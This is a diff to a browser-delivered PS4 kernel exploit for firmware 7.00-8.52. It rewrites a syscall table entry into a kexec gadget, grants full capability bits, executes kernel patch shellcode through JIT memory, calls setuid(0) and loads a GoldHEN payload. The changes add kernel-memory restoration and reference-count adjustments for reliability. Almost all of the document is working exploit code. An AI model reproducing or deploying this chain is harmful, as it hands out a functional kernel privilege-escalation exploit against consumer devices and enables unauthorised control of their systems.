@@ -1515,6 +1515,26 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   kmem.write64(w_rthdr_p, 0);
   log("corrupt pointers cleaned");
 
+  // RESTORE: restore original pipebuf
+  for (let off = 0; off < 0x18; off += 8) {
+    kmem.write64(kpipe.add(off), pipe_save.read64(off));
+  }
+  log("pipebuf restored");
+
+  let mcnt = kmem.read32(main_sock);
+  let wcnt = kmem.read32(worker_sock);
+  let pfcnt = kmem.read32(pipe_file.add(0x28));
+  log(`cnts ${mcnt} ${wcnt} ${pfcnt}`);
+
+  kmem.write32(main_sock, mcnt + 3);
+  kmem.write32(worker_sock, wcnt + 3);
+  kmem.write32(pipe_file.add(0x28), pfcnt + 3);
+
+  mcnt = kmem.read32(main_sock);
+  wcnt = kmem.read32(worker_sock);
+  pfcnt = kmem.read32(pipe_file.add(0x28));
+  log(`cnts ${mcnt} ${wcnt} ${pfcnt}`);
+  
   return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
@@ -1532,120 +1552,106 @@ async function get_patches(url) {
 // some trick toggle the CR0.WP bit. We can just toggle it easily within our
 // shellcode.
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
-  if (!is_ps4) {
-    throw RangeError("ps5 kernel patching unsupported");
-  }
-  if (!(0x700 <= version && version < 0x900)) {
-    // Only 7.00-8.52 supported
-    throw RangeError("kernel patching unsupported");
-  }
+    if (!is_ps4) {
+        throw RangeError("ps5 kernel patching unsupported");
+    }
+    if (!(0x700 <= version && version < 0x900)) {
+        throw RangeError("kernel patching unsupported");
+    }
 
-  log("change sys_aio_submit() to sys_kexec()");
-  // sysent[661] is unimplemented so free for use
-  const sysent_661 = kbase.add(off_sysent_661);
-  const sysent_661_save = new Buffer(0x30); // sizeof syscall
-  for (let off = 0; off < sysent_661_save.size; off += 8) {
-    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
-  }
-  log(`sysent[611] save addr: ${sysent_661_save.addr}`);
-  log("sysent[611] save data:");
-  hexdump(sysent_661_save);
-  // .sy_narg = 6
-  kmem.write32(sysent_661, 6);
-  // .sy_call = gadgets['jmp qword ptr [rsi]']
-  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
-  // .sy_thrcnt = SY_THR_STATIC
-  kmem.write32(sysent_661.add(0x2c), 1);
+    log("change sys_aio_submit() to sys_kexec()");
+    const sysent_661 = kbase.add(off_sysent_661);
+    const sysent_661_save = new Buffer(0x30);
+    
+    for (let off = 0; off < sysent_661_save.size; off += 8) {
+        sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
+    }
+    
+    log(`sysent[661] save addr: ${sysent_661_save.addr}`);
+    
+    kmem.write32(sysent_661, 6);
+    kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
+    kmem.write32(sysent_661.add(0x2c), 1);
 
-  log("set the bits for JIT privs");
-  // TODO: Just set the bits for JIT privs
-  // cr_sceCaps[0] // 0x2000038000000000
-  kmem.write64(p_ucred.add(0x60), -1); // 0xffffffffffffffff
-  // cr_sceCaps[1] // 0x800000000000ff00
-  kmem.write64(p_ucred.add(0x68), -1); // 0xffffffffffffffff
+    log("set the bits for JIT privs");
+    kmem.write64(p_ucred.add(0x60), -1);
+    kmem.write64(p_ucred.add(0x68), -1);
 
-  const buf = await get_patches(patch_elf_loc);
-  const patches = new View1(await buf, 0x1000);
-  let map_size = patches.size;
-  const max_size = 0x10000000;
-  if (map_size > max_size) {
-    die(`patch file too large (>${max_size}): ${map_size}`);
-  }
-  if (map_size === 0) {
-    die("patch file size is zero");
-  }
-  log(`kpatch size: ${map_size} bytes`);
-  map_size = (map_size + page_size) & -page_size;
+    const buf = await get_patches(patch_elf_loc);
+    const patches = new View1(await buf, 0x1000);
+    let map_size = patches.size;
+    const max_size = 0x10000000;
+    if (map_size > max_size) {
+        die(`patch file too large (>${max_size}): ${map_size}`);
+    }
+    if (map_size === 0) {
+        die("patch file size is zero");
+    }
+    log(`kpatch size: ${map_size} bytes`);
+    map_size = (map_size + page_size) & -page_size;
 
-  const prot_rw = 3;
-  const prot_rx = 5;
-  const prot_rwx = 7;
-  const exec_p = new Int(0, 9);
-  const write_p = new Int(max_size, 9);
+    const prot_rw = 3;
+    const prot_rx = 5;
+    const prot_rwx = 7;
+    const exec_p = new Int(0, 9);
+    const write_p = new Int(max_size, 9);
 
-  log("open JIT fds");
-  const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
-  const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);
+    log("open JIT fds");
+    const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
+    const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);
 
-  log("mmap for kpatch shellcode");
-  const exec_addr = chain.sysp("mmap", exec_p, map_size, prot_rx, MAP_SHARED | MAP_FIXED, exec_fd, 0);
-  const write_addr = chain.sysp("mmap", write_p, map_size, prot_rw, MAP_SHARED | MAP_FIXED, write_fd, 0);
+    log("mmap for kpatch shellcode");
+    const exec_addr = chain.sysp("mmap", exec_p, map_size, prot_rx, MAP_SHARED | MAP_FIXED, exec_fd, 0);
+    const write_addr = chain.sysp("mmap", write_p, map_size, prot_rw, MAP_SHARED | MAP_FIXED, write_fd, 0);
 
-  log(`exec_addr: ${exec_addr}`);
-  log(`write_addr: ${write_addr}`);
-  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
-    die("mmap() for jit failed");
-  }
+    log(`exec_addr: ${exec_addr}`);
+    log(`write_addr: ${write_addr}`);
+    if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
+        die("mmap() for jit failed");
+    }
 
-  log("mlock exec_addr for kernel exec");
-  sysi("mlock", exec_addr, map_size);
+    log("mlock exec_addr for kernel exec");
+    sysi("mlock", exec_addr, map_size);
 
-  // mov eax, 0x1337; ret (0xc300_0013_37b8)
-  const test_code = new Int(0x001337b8, 0xc300);
-  write_addr.write64(0, test_code);
+    const test_code = new Int(0x001337b8, 0xc300);
+    write_addr.write64(0, test_code);
 
-  log("test jit exec");
-  sys_void("kexec", exec_addr);
-  let retval = chain.errno;
-  log("returned successfully");
+    log("test jit exec");
+    sys_void("kexec", exec_addr);
+    let retval = chain.errno;
+    log("returned successfully");
 
-  log(`jit retval: ${retval}`);
-  if (retval !== 0x1337) {
-    die("test jit exec failed");
-  }
+    log(`jit retval: ${retval}`);
+    if (retval !== 0x1337) {
+        die("test jit exec failed");
+    }
 
-  log("mlock saved data for kernel restore");
-  const pipe_save = restore_info[1];
-  restore_info[1] = pipe_save.addr;
-  sysi("mlock", restore_info[1], page_size);
-  restore_info[4] = sysent_661_save.addr;
-  sysi("mlock", restore_info[4], page_size);
+    log("execute kpatch...");
+    mem.cpy(write_addr, patches.addr, patches.size);
+    sys_void("kexec", exec_addr);
 
-  log("execute kpatch...");
-  mem.cpy(write_addr, patches.addr, patches.size);
-  sys_void("kexec", exec_addr, ...restore_info);
+    // RESTORE sysent[661] first, immediately after kexec returns,
+    // to minimize the window where syscall 661 points to jmp [rsi]
+    log('restore sysent[661]');
+    for (let off = 0; off < sysent_661_save.size; off += 8) {
+        kmem.write64(sysent_661.add(off), sysent_661_save.read64(off));
+    }
+    log('sysent[661] restored');
 
-  // Explicitly close everything, it should happen implicitly already... did
-  // not fix blackscreen issue.
+    // RESTORE pipebuf (last kmem operation)
+    log('restore pipebuf');
+    const kpipe = restore_info[0];
+    const pipe_save = restore_info[1]; // Buffer object, not .addr
+    for (let off = 0; off < 0x18; off += 8) {
+        kmem.write64(kpipe.add(off), pipe_save.read64(off));
+    }
+    log('pipebuf restored');
 
-  // log("munlock locked data");
-  // sysi("munlock", restore_info[4], page_size);
-  // sysi("munlock", restore_info[1], page_size);
-  // sysi("munlock", exec_addr, map_size);
-
-  // log("munmap kpatch shellcode memory");
-  // sysi("munmap", write_addr, map_size);
-  // sysi("munmap", exec_addr, map_size);
-
-  // One works, both cause an OOM error, then works as it reloads because it kpatched properly
-  // log("close JIT fds");
-  // close(write_fd);
-  // close(exec_fd);
-  log('setuid(0)');
-  sysi('setuid', 0);
-  log('kernel exploit succeeded!');
-  localStorage.ExploitLoaded="yes";
-  sessionStorage.ExploitLoaded="yes";
+    log('setuid(0)');
+    sysi('setuid', 0);
+    log('kernel exploit succeeded!');
+    localStorage.ExploitLoaded = "yes";
+    sessionStorage.ExploitLoaded = "yes";
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1863,12 +1869,20 @@ function runPayload(path) {
   xhr.send();
 }
 
-kexploit().then(() => {
-	setTimeout(() => {
-		runPayload("./goldhen_2.4b18.12.bin");
-		msgs.innerHTML = "GoldHEN v2.4b18.12 Loaded ...";
-	},500);
-}).catch(() => {
+function hostFail() {
     msgs.innerHTML = "Failed to Load! Restart Your Console ...";
     msgs.style.color = "yellow";
+}
+
+kexploit().then(() => {
+    setTimeout(() => {
+        try {
+            runPayload("./goldhen_2.4b18.12.bin");
+            msgs.innerHTML = "GoldHEN v2.4b18.12 Loaded ...";
+        } catch (e) {
+            hostFail();
+        }
+    }, 500);
+}).catch(() => {
+    hostFail();
 });
